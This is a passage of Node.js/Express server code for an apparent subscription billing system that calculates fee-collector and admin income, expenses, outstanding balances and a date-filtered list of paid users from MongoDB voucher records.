      const allVouchersForIncome = await vouchersCol.find({}).toArray();
      let incomeFromVouchers = 0;

      allVouchersForIncome.forEach(voucher => {
        if (Array.isArray(voucher.months)) {
          voucher.months.forEach(month => {
            // Check if month has paid amount and receivedBy matches
            const monthReceivedBy = month.receivedBy || '';
            const paymentHistory = Array.isArray(month.paymentHistory) ? month.paymentHistory : [];
            const paymentHistoryReceivedBy = paymentHistory.map((p) => p.receivedBy || '').filter(Boolean);

            const monthMatchesReceivedBy = monthReceivedBy &&
              new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i').test(monthReceivedBy);
            const historyMatchesReceivedBy = paymentHistoryReceivedBy.some((rb) =>
              new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i').test(rb)
            );

            if (monthMatchesReceivedBy || historyMatchesReceivedBy) {
              // If paymentHistory exists, use it (more accurate - individual payments)
              // Otherwise use month.paidAmount
              if (paymentHistory.length > 0) {
                paymentHistory.forEach((payment) => {
                  const paymentReceivedBy = payment.receivedBy || '';
                  if (paymentReceivedBy && new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i').test(paymentReceivedBy)) {
                    const amount = Number(payment.amount || 0);
                    incomeFromVouchers += amount;

                    // Separate by payment method
                    const paymentMethodStr = (payment.paymentMethod || '').trim().toLowerCase();
                    if (paymentMethodStr === 'cash') {
                      cashIncome += amount;
                    } else if (paymentMethodStr === 'bank transfer') {
                      bankIncome += amount;
                    }
                  }
                });
              } else if (monthMatchesReceivedBy) {
                // No paymentHistory, but month.receivedBy matches - use month.paidAmount
                const paidAmt = Number(month.paidAmount || 0);
                incomeFromVouchers += paidAmt;
                // If no paymentHistory, check month.paymentMethod
                const monthMethod = (month.paymentMethod || '').trim().toLowerCase();
                if (monthMethod === 'cash') {
                  cashIncome += paidAmt;
                } else if (monthMethod === 'bank transfer') {
                  bankIncome += paidAmt;
                }
              }
            }
          });
        }
      });

      totalIncome = incomeFromVouchers;
      console.log(`💰 Total income from vouchers (receivedBy=${feeCollectorTrimmed}): Rs ${totalIncome}`);
      console.log(`💵 Cash income: Rs ${cashIncome}`);
      console.log(`🏦 Bank income: Rs ${bankIncome}`);
    } else if (shouldRecalculate && !feeCollectorTrimmed) {
      // No feeCollector filter - Admin login - Recalculate from vouchers
      // CRITICAL: Admin ki income sirf "Admin" ya "Myself" select karne par increase hogi
      // Employee name select karne par admin ki income increase nahi hogi
      console.log(`💰 Admin login - Calculating income from vouchers with receivedBy: "Admin" or "Myself"`);

      const allVouchersForIncome = await vouchersCol.find({}).toArray();
      let incomeFromVouchers = 0;

      allVouchersForIncome.forEach(voucher => {
        if (Array.isArray(voucher.months)) {
          voucher.months.forEach(month => {
            // Check if month has paid amount and receivedBy is "Admin" or "Myself"
            const monthReceivedBy = month.receivedBy || '';
            const paymentHistory = Array.isArray(month.paymentHistory) ? month.paymentHistory : [];

            console.log(`\n🔍 Checking month: ${month.month}`);
            console.log(`   month.paidAmount: Rs ${month.paidAmount || 0}`);
            console.log(`   month.receivedBy: ${monthReceivedBy}`);
            console.log(`   paymentHistory.length: ${paymentHistory.length}`);
            if (paymentHistory.length > 0) {
              console.log(`   paymentHistory entries:`, paymentHistory.map(p => `Rs ${p.amount} by ${p.receivedBy} (${p.paymentMethod})`).join(', '));
            }

            // CRITICAL: Always use paymentHistory for accurate income calculation
            // paymentHistory contains individual payments with their receivedBy values
            // This prevents double-counting and ensures only payments made by "Admin" or "Myself" are counted
            // IMPORTANT: We ONLY count from paymentHistory to avoid counting total paidAmount
            // which might include payments from other receivers (e.g., employee's 1000 + admin's 200 = 1200)
            if (paymentHistory.length > 0) {
              // Use paymentHistory - only count payments where receivedBy is "Admin" or "Myself"
              // This is the most accurate method as it tracks each individual payment
              let monthIncome = 0;
              paymentHistory.forEach((payment) => {
                const paymentReceivedBy = payment.receivedBy || '';
                const paymentAmount = Number(payment.amount || 0);
                const paymentMethodStr = (payment.paymentMethod || '').trim().toLowerCase();

                // Check for both "Admin" and "Myself"
                const isAdminPayment = paymentReceivedBy &&
                  (new RegExp(`^Admin$`, 'i').test(paymentReceivedBy.trim()) ||
                    new RegExp(`^Myself$`, 'i').test(paymentReceivedBy.trim()));

                if (isAdminPayment) {
                  monthIncome += paymentAmount;

                  // Separate by payment method
                  if (paymentMethodStr === 'cash') {
                    cashIncome += paymentAmount;
                  } else if (paymentMethodStr === 'bank transfer') {
                    bankIncome += paymentAmount;
                  }

                  console.log(`   ✅ Counting payment from paymentHistory: Rs ${paymentAmount} (receivedBy: ${paymentReceivedBy}, method: ${payment.paymentMethod})`);
                } else {
                  console.log(`   ⏭️ Skipping payment: Rs ${paymentAmount} (receivedBy: ${paymentReceivedBy}, not "Admin" or "Myself")`);
                }
              });
              incomeFromVouchers += monthIncome;
              console.log(`   💰 Month income added: Rs ${monthIncome}`);
            } else {
              // No paymentHistory - DO NOT COUNT to avoid double-counting
              // month.paidAmount includes ALL payments (employee + admin), so we can't determine
              // how much was paid by admin without paymentHistory
              // This ensures accurate income calculation
              console.log(`   ⚠️ No paymentHistory for ${month.month} - skipping (cannot determine admin's portion without paymentHistory)`);
              console.log(`   ⚠️ month.paidAmount = Rs ${month.paidAmount || 0} (may include payments from other receivers)`);
              console.log(`   ⏭️ NOT counting this month (no paymentHistory)`);
            }
          });
        }
      });

      totalIncome = incomeFromVouchers;
      console.log(`💰 Admin total income from vouchers (receivedBy="Admin" or "Myself"): Rs ${totalIncome}`);
      console.log(`💵 Cash income: Rs ${cashIncome}`);
      console.log(`🏦 Bank income: Rs ${bankIncome}`);

      // CRITICAL: Add transfer amounts from fee collectors to admin income
      // When fee collectors transfer money to admin, it should be added to admin's total income
      try {
        let collectionsCollection = db.collection('collections');

        // Check if collections collection exists
        const collections = await db.listCollections().toArray();
        const collectionExists = collections.some(c => c.name === 'collections');

        if (collectionExists) {
          // Get all transfer amounts (fee collectors se admin ko transfer kiye gaye amounts)
          const allTransfers = await collectionsCollection.find({}).toArray();
          let totalTransferAmount = 0;

          allTransfers.forEach((transfer) => {
            const transferAmount = Number(transfer.amount || 0);
            totalTransferAmount += transferAmount;
            console.log(`   💰 Transfer from ${transfer.feeCollector}: Rs ${transferAmount}`);
          });

          totalIncome += totalTransferAmount;
          console.log(`💰 Total transfer amount added to admin income: Rs ${totalTransferAmount}`);
          console.log(`💰 Admin total income (vouchers + transfers): Rs ${totalIncome}`);
        } else {
          console.log(`ℹ️ Collections collection does not exist - no transfer amounts to add`);
        }
      } catch (error) {
        console.error('❌ Error fetching transfer amounts:', error);
        // Don't fail the request if transfer fetch fails, just log the error
      }
    }

    // Total expense - combine both transactions and expenses collections
    // For fee collector, filter by paidBy field
    const expenseMatchQuery = { type: 'expense' };
    if (feeCollector) {
      expenseMatchQuery.paidBy = { $regex: new RegExp(`^${feeCollector.trim().replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') };
    }

    const expenseResultFromTransactions = await transactionsCollection.aggregate([
      { $match: expenseMatchQuery },
      { $group: { _id: null, total: { $sum: '$amount' } } }
    ]).toArray();

    // Get expenses from dedicated expenses collection
    const expensesCollection = db.collection('expenses');
    const expensesMatchQuery = {};
    if (feeCollector) {
      expensesMatchQuery.paidBy = { $regex: new RegExp(`^${feeCollector.trim().replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') };
    }

    const expenseResultFromExpenses = await expensesCollection.aggregate([
      { $match: expensesMatchQuery },
      { $group: { _id: null, total: { $sum: '$amount' } } }
    ]).toArray();

    const transactionsExpenseTotal = expenseResultFromTransactions.length > 0 ? expenseResultFromTransactions[0].total : 0;
    const expensesTotal = expenseResultFromExpenses.length > 0 ? expenseResultFromExpenses[0].total : 0;

    // Add both totals for the complete expense amount
    const totalExpense = Number(transactionsExpenseTotal) + Number(expensesTotal);
    console.log(`💰 Dashboard stats: Total expense = ${totalExpense} (transactions: ${transactionsExpenseTotal}, expenses: ${expensesTotal})${feeCollector ? ` (filtered by paidBy: ${feeCollector})` : ''}`);

    // Outstanding/Balance - Calculate from vouchers to match unpaid-users.tsx display amounts
    // CRITICAL: Only include users whose expiry date has passed (after 12 PM on expiry date)
    const vouchersCollection = db.collection('vouchers');
    const allVouchers = await vouchersCollection.find({}).toArray();

    // Get unpaid and partial users (same as unpaid-users.tsx)
    let unpaidUsersListQuery = {
      $and: [
        {
          $or: [
            { serviceStatus: { $ne: 'inactive' } },
            { serviceStatus: { $exists: false } }
          ]
        },
        {
          $or: [
            { status: 'unpaid' },
            {
              $and: [
                { status: 'partial' },
                { _id: { $in: objectIdsWithUnpaid } }
              ]
            }
          ]
        }
      ]
    };
    if (feeCollector) {
      unpaidUsersListQuery.feeCollector = { $regex: new RegExp(`^${feeCollector.trim()}$`, 'i') };
    }
    if (assignTo) {
      unpaidUsersListQuery.assignTo = { $regex: new RegExp(`^${assignTo.trim()}$`, 'i') };
    }

    const allUnpaidUsersList = await usersCollection.find(unpaidUsersListQuery).toArray();

    // Filter to exclude expiring soon users only (not by expiry date)
    // This ensures Pay Later users with future expiry are included in outstanding
    const unpaidUsersList = allUnpaidUsersList.filter(user => {
      // Exclude only expiring soon users
      return !user.showInExpiringSoon;
    });

    console.log(`📊 Outstanding - Unpaid users: ${allUnpaidUsersList.length} total, ${unpaidUsersList.length} after excluding expiring soon`);

    let partialUsersQuery = {
      $and: [
        {
          $or: [
            { serviceStatus: { $ne: 'inactive' } },
            { serviceStatus: { $exists: false } }
          ]
        },
        // CRITICAL: Show users with 'partial' OR 'superbalance' status
        // AND include 'unpaid' users who have at least one partial month
        {
          $or: [
            { status: 'partial', remainingAmount: { $gt: 0 } },
            { status: 'superbalance' },
            {
              $and: [
                { status: 'unpaid' },
                { _id: { $in: objectIdsWithPartial } }
              ]
            }
          ]
        }
      ]
    };
    if (feeCollector) {
      partialUsersQuery.feeCollector = { $regex: new RegExp(`^${feeCollector.trim()}$`, 'i') };
    }
    if (assignTo) {
      partialUsersQuery.assignTo = { $regex: new RegExp(`^${assignTo.trim()}$`, 'i') };
    }

    const allPartialUsers = await usersCollection.find(partialUsersQuery).toArray();

    // Filter to exclude expiring soon users only (not by expiry date)
    const partialUsers = allPartialUsers.filter(user => {
      // Exclude only expiring soon users
      return !user.showInExpiringSoon;
    });

    console.log(`📊 Outstanding - Partial users: ${allPartialUsers.length} total, ${partialUsers.length} after excluding expiring soon`);

    // Calculate outstanding using voucher-based totals (same as unpaid-users.tsx)
    const calculateUserOutstanding = (user) => {
      const userVoucher = allVouchers.find(v => v.userId === user._id.toString());
      if (userVoucher && Array.isArray(userVoucher.months)) {
        return userVoucher.months.reduce((sum, month) => {
          const rem = (month.remainingAmount !== undefined && month.remainingAmount !== null)
            ? Number(month.remainingAmount)
            : Math.max(0, Number(month.packageFee || 0) - Number(month.paidAmount || 0));
          return rem > 0 ? sum + rem : sum;
        }, 0);
      }

      // For users without vouchers (e.g., new Pay Later users)
      // Use their package amount as outstanding
      if (user.status === 'unpaid' && user.amount) {
        return Number(user.amount || 0);
      }

      // For partial users without vouchers, use remainingAmount
      if (user.status === 'partial' && user.remainingAmount) {
        return Number(user.remainingAmount || 0);
      }

      return 0;
    };

    const unpaidTotal = unpaidUsersList.reduce((sum, user) => sum + calculateUserOutstanding(user), 0);
    const partialTotal = partialUsers.reduce((sum, user) => sum + calculateUserOutstanding(user), 0);

    console.log('📊 Dashboard Outstanding Calculation (excluding expiring soon):', {
      allUnpaidUsers: allUnpaidUsersList.length,
      unpaidUsersAfterFilter: unpaidUsersList.length,
      allPartialUsers: allPartialUsers.length,
      partialUsersAfterFilter: partialUsers.length,
      unpaidTotal,
      partialTotal,
      totalOutstanding: unpaidTotal + partialTotal,
      note: 'Includes Pay Later users with future expiry dates'
    });

    const outstanding = Number(unpaidTotal) + Number(partialTotal); // Total from voucher-based calculation
    const balanceCustomers = partialUsers.length;

    // 💰 SAVE/UPDATE INCOME IN incomes COLLECTION
    // ONLY save if we recalculated from vouchers (shouldRecalculate = true)
    // If we used existing income, don't overwrite it (to preserve transfers)
    try {
      if (shouldRecalculate && feeCollectorTrimmed) {
        // Fee Collector ki income save/update karein
        const existingIncome = await incomesCollection.findOne({
          name: { $regex: new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') }
        });

        if (existingIncome) {
          // Update existing income - cashIncome and bankIncome
          await incomesCollection.updateOne(
            { name: { $regex: new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') } },
            {
              $set: {
                cashIncome: cashIncome || 0,
                bankIncome: bankIncome || 0,
                lastUpdated: new Date()
              }
            }
          );
          console.log(`💰 Updated income for ${feeCollectorTrimmed}: Cash Rs ${cashIncome}, Bank Rs ${bankIncome}`);
        } else {
          // Create new income record - cashIncome and bankIncome
          await incomesCollection.insertOne({
            name: feeCollectorTrimmed,
            cashIncome: cashIncome || 0,
            bankIncome: bankIncome || 0,
            createdAt: new Date(),
            lastUpdated: new Date()
          });
          console.log(`💰 Created new income record for ${feeCollectorTrimmed}: Cash Rs ${cashIncome}, Bank Rs ${bankIncome}`);
        }
      } else if (shouldRecalculate && !feeCollectorTrimmed) {
        // Admin ki income save/update karein (only if recalculated)
        const existingAdminIncome = await incomesCollection.findOne({
          name: { $regex: new RegExp(`^Admin$`, 'i') }
        });

        if (existingAdminIncome) {
          // Update existing admin income - cashIncome and bankIncome
          await incomesCollection.updateOne(
            { name: { $regex: new RegExp(`^Admin$`, 'i') } },
            {
              $set: {
                cashIncome: cashIncome || 0,
                bankIncome: bankIncome || 0,
                lastUpdated: new Date()
              }
            }
          );
          console.log(`💰 Updated income for Admin: Cash Rs ${cashIncome}, Bank Rs ${bankIncome}`);
        } else {
          // Create new admin income record - cashIncome and bankIncome
          await incomesCollection.insertOne({
            name: 'Admin',
            cashIncome: cashIncome || 0,
            bankIncome: bankIncome || 0,
            createdAt: new Date(),
            lastUpdated: new Date()
          });
          console.log(`💰 Created new income record for Admin: Cash Rs ${cashIncome}, Bank Rs ${bankIncome}`);
        }
      } else {
        // Using existing income, not overwriting
        console.log(`💰 Skipping income save - using existing income from database (preserves transfers)`);
      }
    } catch (incomeError) {
      console.error('❌ Error saving income to incomes collection:', incomeError);
      // Don't fail the request if income save fails, just log the error
    }

    res.status(200).json({
      success: true,
      data: {
        totalUsers,
        paidUsers,
        totalIncome,
        cashIncome: cashIncome || 0,
        bankIncome: bankIncome || 0,
        totalExpense,
        unpaidUsers,
        outstanding,
        balance: outstanding, // Same as outstanding - sum of remainingAmount from partial users
        balanceCustomers, // Number of customers with remaining balance
        expiringSoon,
        activeUsers,        // Users with serviceStatus = 'active' or not set
        deactivatedUsers    // Users with serviceStatus = 'inactive'
      }
    });
  } catch (error) {
    console.error('Error fetching dashboard stats:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching dashboard stats',
      error: error.message
    });
  }
});

// GET paid users (with date filter and pagination)
app.get('/api/users/paid', async (req, res) => {
  try {
    const usersCollection = db.collection('users');
    const vouchersCollection = db.collection('vouchers');
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const paymentDate = req.query.paymentDate; // YYYY-MM-DD format (deprecated, use fromDate/toDate)
    const fromDate = req.query.fromDate; // YYYY-MM-DD format
    const toDate = req.query.toDate; // YYYY-MM-DD format
    const feeCollector = req.query.feeCollector; // Fee collector name filter
    const assignTo = req.query.assignTo; // Technician assignment filter
    const search = req.query.search; // Search query for userName, userId, simNo, etc.

    let userIds = [];
    let totalCollectionAmount = 0; // Track total collection for date range

    // If date range filter is provided (fromDate and toDate)
    if (fromDate && toDate) {
      const [fromYearStr, fromMonthStr, fromDayStr] = fromDate.split('-');
      const [toYearStr, toMonthStr, toDayStr] = toDate.split('-');

      const fromYear = parseInt(fromYearStr, 10);
      const fromMonth = parseInt(fromMonthStr, 10) - 1;
      const fromDay = parseInt(fromDayStr, 10);

      const toYear = parseInt(toYearStr, 10);
      const toMonth = parseInt(toMonthStr, 10) - 1;
      const toDay = parseInt(toDayStr, 10);

      if (!Number.isNaN(fromYear) && !Number.isNaN(fromMonth) && !Number.isNaN(fromDay) &&
        !Number.isNaN(toYear) && !Number.isNaN(toMonth) && !Number.isNaN(toDay)) {

        // CRITICAL: Use PKT (UTC+5) timezone for date comparison
        // Create date strings in YYYY-MM-DD format for simple string comparison
        const startDateStr = `${fromYear}-${String(fromMonth + 1).padStart(2, '0')}-${String(fromDay).padStart(2, '0')}`;
        const endDateStr = `${toYear}-${String(toMonth + 1).padStart(2, '0')}-${String(toDay).padStart(2, '0')}`;

        console.log(`📅 Date range filter: ${startDateStr} to ${endDateStr} (using PKT string comparison)`);

        const formatToIso = (date) => date.toISOString().split('T')[0];
        const formatToLocal = (date) => {
          try {
            return new Intl.DateTimeFormat('en-CA', { timeZone: 'Asia/Karachi' }).format(date);
          } catch (err) {
            return formatToIso(date);
          }
        };

        const normalizeToIsoString = (value) => {
          if (!value) return null;
          if (value instanceof Date) {
            // Prioritize PKT timezone format
            return [formatToLocal(value)];
          }

          if (typeof value === 'string') {
            const native = new Date(value);
            if (!Number.isNaN(native.getTime())) {
              // Prioritize PKT timezone format
              return [formatToLocal(native)];
            }

            const parts = value.split(/[-\/]/);
            if (parts.length === 3) {
              let [a, b, c] = parts;
              if (a.length === 4) {
                // Already YYYY-MM-DD format
                return [`${a}-${b.padStart(2, '0')}-${c.padStart(2, '0')}`];
              }
              // DD-MM-YYYY or DD/MM/YYYY format - convert to YYYY-MM-DD
              const dayPart = a.padStart(2, '0');
              const monthPart = b.padStart(2, '0');
              const yearPart = c;
              return [`${yearPart}-${monthPart}-${dayPart}`];
            }
          }

          return null;
        };

        const isDateInRange = (value) => {
          const normalized = normalizeToIsoString(value);
          if (!normalized) return false;

          // Use PKT timezone string comparison (YYYY-MM-DD format)
          return normalized.some((isoDate) => {
            // isoDate is already in YYYY-MM-DD format
            // Simple string comparison works because YYYY-MM-DD sorts correctly
            return isoDate >= startDateStr && isoDate <= endDateStr;
          });
        };

        // Include both 'paid' and 'partial' months (users with payments show in Paid tab)
        const vouchers = await vouchersCollection.find({ 'months.status': { $in: ['paid', 'partial'] } }).toArray();
        const feeCollectorTrimmed = feeCollector ? feeCollector.trim() : null;

        const filteredVouchers = vouchers.filter((voucher) => {
          const months = Array.isArray(voucher.months) ? voucher.months : [];
          // Include both 'paid' and 'partial' months (show users who made payments)
          const paidOrPartialMonths = months.filter((month) => ['paid', 'partial'].includes(month.status));

          const monthMatches = paidOrPartialMonths.some((month) => {
            // Check payment history first (more accurate)
            const paymentHistory = Array.isArray(month.paymentHistory) ? month.paymentHistory : [];
            if (paymentHistory.length > 0) {
              return paymentHistory.some((entry) => {
                const dateInRange = isDateInRange(entry?.date);
                if (!dateInRange) return false;

                if (feeCollectorTrimmed) {
                  const rb = entry.receivedBy || '';
                  return new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i').test(rb);
                }
                return true;
              });
            }

            // Fallback to month-level check if no history
            const dateInRange = isDateInRange(month.createdAt) || isDateInRange(month.date);
            if (!dateInRange) return false;

            // Check receivedBy filter
            if (feeCollectorTrimmed) {
              const monthReceivedBy = month.receivedBy || '';
              return new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i').test(monthReceivedBy);
            }
            return true;
          });

          if (monthMatches) {
            // Calculate total collection from matched paid/partial months
            paidOrPartialMonths.forEach((month) => {
              const paymentHistory = Array.isArray(month.paymentHistory) ? month.paymentHistory : [];

              if (paymentHistory.length > 0) {
                // Sum from matching history entries only
                paymentHistory.forEach((entry) => {
                  const dateInRange = isDateInRange(entry?.date);
                  if (dateInRange) {
                    if (feeCollectorTrimmed) {
                      const rb = entry.receivedBy || '';
                      if (new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i').test(rb)) {
                        totalCollectionAmount += (entry.amount || 0);
                      }
                    } else {
                      totalCollectionAmount += (entry.amount || 0);
                    }
                  }
                });
              } else {
                // Fallback to month level logic
                const dateInRange = isDateInRange(month.createdAt) || isDateInRange(month.date);
                if (dateInRange) {
                  if (feeCollectorTrimmed) {
                    const monthReceivedBy = month.receivedBy || '';
                    if (new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i').test(monthReceivedBy)) {
                      totalCollectionAmount += (month.paidAmount || month.packageFee || 0);
                    }
                  } else {
                    totalCollectionAmount += (month.paidAmount || month.packageFee || 0);
                  }
                }
              }
            });
            return true;
          }

          // No fallback - strictly filter by paymentHistory dates only
          return false;
        });

        console.log(`📊 Query result: Found ${filteredVouchers.length} vouchers in date range ${fromDate} to ${toDate}${feeCollectorTrimmed ? ` (filtered by receivedBy: ${feeCollectorTrimmed})` : ''}`);
        console.log(`💰 Total collection amount: Rs ${totalCollectionAmount}`);

        userIds = filteredVouchers.map(v => v.userId);
        console.log(`Found ${userIds.length} user(s) with paid/partial activity in date range`);
      } else {
        console.log(`⚠️ Invalid date range received: ${fromDate} to ${toDate}`);
      }
    }
    // Fallback to single date filter for backward compatibility
    else if (paymentDate) {
      const [yearStr, monthStr, dayStr] = paymentDate.split('-');
      const year = parseInt(yearStr, 10);
      const month = parseInt(monthStr, 10) - 1; // JS Date month is 0-indexed
      const day = parseInt(dayStr, 10);

      if (!Number.isNaN(year) && !Number.isNaN(month) && !Number.isNaN(day)) {
        const startOfDay = new Date(year, month, day, 0, 0, 0, 0);
        const endOfDay = new Date(year, month, day + 1, 0, 0, 0, 0);

        console.log(`Payment date filter: ${paymentDate} → window ${startOfDay.toISOString()} to ${endOfDay.toISOString()}`);

        const formatToIso = (date) => date.toISOString().split('T')[0];
        const formatToLocal = (date) => {
          try {
            return new Intl.DateTimeFormat('en-CA', { timeZone: 'Asia/Karachi' }).format(date);
          } catch (err) {
            // Fallback to ISO if Intl with timezone not available
            return formatToIso(date);
          }
        };

        const normalizeToIsoString = (value) => {
          if (!value) return null;
          if (value instanceof Date) {
            return [formatToIso(value), formatToLocal(value)];
          }

          if (typeof value === 'string') {
            // handles ISO strings, yyyy-mm-dd, dd-mm-yyyy, dd/mm/yyyy
            const native = new Date(value);
            if (!Number.isNaN(native.getTime())) {
              return [formatToIso(native), formatToLocal(native)];
            }

            const parts = value.split(/[-\/]/);
            if (parts.length === 3) {
              let [a, b, c] = parts;
              if (a.length === 4) {
                // already yyyy-mm-dd style
                return [`${a}-${b.padStart(2, '0')}-${c.padStart(2, '0')}`];
              }
              // assume dd-mm-yyyy
              const dayPart = a.padStart(2, '0');
              const monthPart = b.padStart(2, '0');
              const yearPart = c;
              return [`${yearPart}-${monthPart}-${dayPart}`];
            }
          }

          return null;
        };

        const matchesPaymentDate = (value) => {
          const normalized = normalizeToIsoString(value);
          if (!normalized) return false;
          return normalized.some((iso) => iso === paymentDate);
        };

        // Include both 'paid' and 'partial' months (users with payments show in Paid tab)
        const vouchers = await vouchersCollection.find({ 'months.status': { $in: ['paid', 'partial'] } }).toArray();
        const feeCollectorTrimmed = feeCollector ? feeCollector.trim() : null;

        const filteredVouchers = vouchers.filter((voucher) => {
          const months = Array.isArray(voucher.months) ? voucher.months : [];
          // Include both 'paid' and 'partial' months (show users who made payments)
          const paidOrPartialMonths = months.filter((month) => ['paid', 'partial'].includes(month.status));

          const monthMatches = paidOrPartialMonths.some((month) => {
            // Check date match first
            const dateMatches = matchesPaymentDate(month.createdAt) || matchesPaymentDate(month.date) ||
              (Array.isArray(month.paymentHistory) && month.paymentHistory.some((entry) => matchesPaymentDate(entry?.date)));

            if (!dateMatches) return false;

            // Check receivedBy filter
            if (feeCollectorTrimmed) {
              // Fee collector filter - check if receivedBy matches feeCollector
              const monthReceivedBy = month.receivedBy || '';
              const paymentHistoryReceivedBy = Array.isArray(month.paymentHistory)
                ? month.paymentHistory.map((p) => p.receivedBy || '').filter(Boolean)
                : [];

              const monthMatchesReceivedBy = monthReceivedBy &&
                new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i').test(monthReceivedBy);
              const historyMatchesReceivedBy = paymentHistoryReceivedBy.some((rb) =>
                new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i').test(rb)
              );

              return monthMatchesReceivedBy || historyMatchesReceivedBy;
            } else {
              // No fee collector filter (Admin) - show ALL paid/partial payments regardless of receivedBy
              return true;
            }
          });

          if (monthMatches) {
            return true;
          }

          const topLevelMatch = (matchesPaymentDate(voucher.createdAt) || matchesPaymentDate(voucher.updatedAt));
          return topLevelMatch && paidOrPartialMonths.length > 0;
        });

        console.log(`📊 Query result: Found ${filteredVouchers.length} vouchers matching ${paymentDate}${feeCollectorTrimmed ? ` (filtered by receivedBy: ${feeCollectorTrimmed})` : ''}`);
        filteredVouchers.forEach(v => {
          console.log(`  - User: ${v.userName}, voucherCreated: ${v.createdAt}, months: ${(v.months || []).length}`);
        });

        userIds = filteredVouchers.map(v => v.userId);
        console.log(`Found ${userIds.length} user(s) with paid/partial activity on ${paymentDate}`);
      } else {
        console.log(`⚠️ Invalid paymentDate received: ${paymentDate}`);
      }
    }

    // CRITICAL: Month-level filtering - show users who have AT LEAST ONE paid month
    // Check vouchers to find users with paid/partial months
    // IMPORTANT: If feeCollector filter is provided, also check receivedBy in vouchers
    let usersWithPaidMonths = [];

    if (!paymentDate && !fromDate && !toDate) {
      // No date filter at all - check all vouchers for paid months
      const allVouchers = await vouchersCollection.find({}).toArray();

      const userIdsWithPaidMonths = new Set();
      const feeCollectorTrimmed = feeCollector ? feeCollector.trim() : null;

      // FALLBACK: Get users assigned to this feeCollector for old payments
      let usersAssignedToFeeCollector = new Set();
      if (feeCollectorTrimmed) {
        const assignedUsers = await usersCollection.find({
          feeCollector: { $regex: new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') }
        }).toArray();
        assignedUsers.forEach(u => usersAssignedToFeeCollector.add(u._id.toString()));
        console.log(`📋 Found ${usersAssignedToFeeCollector.size} users assigned to ${feeCollectorTrimmed}`);
      }

      allVouchers.forEach(voucher => {
        if (Array.isArray(voucher.months)) {
          // Check if voucher has paid or partial months (users who made payments)
          // If feeCollector filter is provided, also check receivedBy
          const hasPaidMonth = voucher.months.some(m => {
            // Include both 'paid' and 'partial' status (show users who made payments)
            // Include 'paid' (fully paid) or 'partial' (only if they actually paid something)
            const isPaid = m.status === 'paid' || (m.status === 'partial' && Number(m.paidAmount || 0) > 0);
            if (!isPaid) return false;

            // Check receivedBy filter
            if (feeCollectorTrimmed) {
              // CRITICAL: Check THREE conditions (ANY one should be true):
              // 1. User is assigned to this fee collector (user.feeCollector field)
              // 2. Payment was received by this fee collector (receivedBy field)
              // 3. Payment history contains this fee collector

              const userIsAssigned = usersAssignedToFeeCollector.has(voucher.userId.toString());

              const monthReceivedBy = m.receivedBy || '';
              const paymentHistoryReceivedBy = Array.isArray(m.paymentHistory)
                ? m.paymentHistory.map((p) => p.receivedBy || '').filter(Boolean)
                : [];

              // Match if receivedBy matches feeCollector (case-insensitive)
              const monthMatches = monthReceivedBy &&
                new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i').test(monthReceivedBy);
              const historyMatches = paymentHistoryReceivedBy.some((rb) =>
                new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i').test(rb)
              );

              // Debug logging for first few vouchers
              if (userIdsWithPaidMonths.size < 3) {
                console.log(`\n🔍 Checking voucher for user ${voucher.userId}:`);
                console.log(`   Month: ${m.month}, Status: ${m.status}`);
                console.log(`   User assigned to ${feeCollectorTrimmed}? ${userIsAssigned}`);
                console.log(`   month.receivedBy: "${monthReceivedBy}" → matches? ${monthMatches}`);
                console.log(`   paymentHistory: ${paymentHistoryReceivedBy.length > 0 ? paymentHistoryReceivedBy.join(', ') : 'None'} → matches? ${historyMatches}`);
              }

              // ✅ FIXED: Include user if ANY condition is true
              return userIsAssigned || monthMatches || historyMatches;
            } else {
              // No fee collector filter (Admin) - show ALL paid/partial payments regardless of receivedBy
              return true;
            }
          });

          if (hasPaidMonth && voucher.userId) {
            userIdsWithPaidMonths.add(voucher.userId.toString());
          }
        }
      });

      usersWithPaidMonths = Array.from(userIdsWithPaidMonths);
      console.log(`📊 Found ${usersWithPaidMonths.length} users with at least one paid/partial month${feeCollectorTrimmed ? ` (filtered by receivedBy: ${feeCollectorTrimmed})` : ''}`);

      // Debug: Log first few user IDs for verification
      if (usersWithPaidMonths.length > 0 && feeCollectorTrimmed) {
        console.log(`🔍 Sample user IDs found:`, usersWithPaidMonths.slice(0, 5));
      }
    }

    // Base query - include users with paid OR partial status
    // CRITICAL: 'partial' users show in BOTH Paid tab (because they made payment) 
    // AND Balance tab (because they have remaining amount)
    let query = {
      $and: [
        {
          $or: [
            { serviceStatus: { $ne: 'inactive' } },
            { serviceStatus: { $exists: false } }
          ]
        },
        {
          // Include 'unpaid' users who have at least one paid month in vouchers
          // This ensures users with multi-month vouchers (like Aam Tech) show up
          status: { $in: ['paid', 'partial', 'unpaid'] }
        }
      ]
    };

    // CRITICAL: If feeCollector filter is provided:
    // - Income calculation: Only count payments where receivedBy matches feeCollector (already done above)
    // - Paid users list: Show users where receivedBy matches feeCollector (payment receiver)
    // This ensures payments show up for the employee who actually received them
